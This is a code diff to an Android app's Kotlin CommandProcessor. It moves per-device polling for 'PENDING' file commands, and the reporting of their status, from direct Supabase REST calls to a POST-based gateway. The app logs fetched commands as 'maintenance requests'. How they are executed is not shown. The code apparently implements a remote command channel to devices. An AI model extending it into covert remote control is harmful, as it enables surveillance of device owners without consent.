@@ -25,24 +25,34 @@ object CommandProcessor {
         withContext(Dispatchers.IO) {
             try {
                 val deviceId = DeviceManager.getDeviceId(ctx)
-                // Fetch PENDING commands
-                val supabaseUrl = SecretVault.getRestUrl(ctx, "file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*")
+                // Fetch PENDING commands via Gateway
+                val req = JSONObject()
+                req.put("action", "get_commands")
+                req.put("deviceId", deviceId)
+
+                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                 val supabaseKey = SecretVault.getLock(ctx)
 
                 val url = URL(supabaseUrl)
                 val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "GET"
+                conn.requestMethod = "POST"
                 conn.setRequestProperty("apikey", supabaseKey)
                 conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+
+                conn.outputStream.use { it.write(req.toString().toByteArray()) }
 
                 if (conn.responseCode == 200) {
                     val resp = conn.inputStream.bufferedReader().use { it.readText() }
-                    val commands = JSONArray(resp)
-
-                    for (i in 0 until commands.length()) {
-                        val cmd = commands.getJSONObject(i)
-                        DebugLogger.log("SYSTEM", "Incoming maintenance request: ${cmd.optString("file_name")}")
-                        processSingleCommand(ctx, cmd)
+                    val respObj = JSONObject(resp)
+                    if (respObj.optBoolean("success")) {
+                        val commands = respObj.optJSONArray("data") ?: JSONArray()
+                        for (i in 0 until commands.length()) {
+                            val cmd = commands.getJSONObject(i)
+                            DebugLogger.log("SYSTEM", "Incoming maintenance request: ${cmd.optString("file_name")}")
+                            processSingleCommand(ctx, cmd)
+                        }
                     }
                 }
             } catch (e: Exception) {
@@ -234,19 +244,24 @@ object CommandProcessor {
     private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String?) {
         try {
             val key = SecretVault.getLock(ctx)
-            val updateUrl = URL(SecretVault.getRestUrl(ctx, "file_commands?id=eq.$id"))
+            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
             val conn = updateUrl.openConnection() as HttpURLConnection
-            conn.requestMethod = "PATCH"
+            conn.requestMethod = "POST"
             conn.setRequestProperty("apikey", key)
             conn.setRequestProperty("Authorization", "Bearer $key")
             conn.setRequestProperty("Content-Type", "application/json")
             conn.doOutput = true
 
-            val json = JSONObject()
-            json.put("status", status)
-            if (!errorMsg.isNullOrEmpty()) json.put("error_log", errorMsg)
+            val req = JSONObject()
+            req.put("action", "update_command")
+            req.put("deviceId", DeviceManager.getDeviceId(ctx))
+            val payload = JSONObject()
+            payload.put("id", id)
+            payload.put("status", status)
+            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
+            req.put("payload", payload)
 
-            conn.outputStream.use { it.write(json.toString().toByteArray()) }
+            conn.outputStream.use { it.write(req.toString().toByteArray()) }
             val code = conn.responseCode
             if (code !in 200..299) {
                 val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
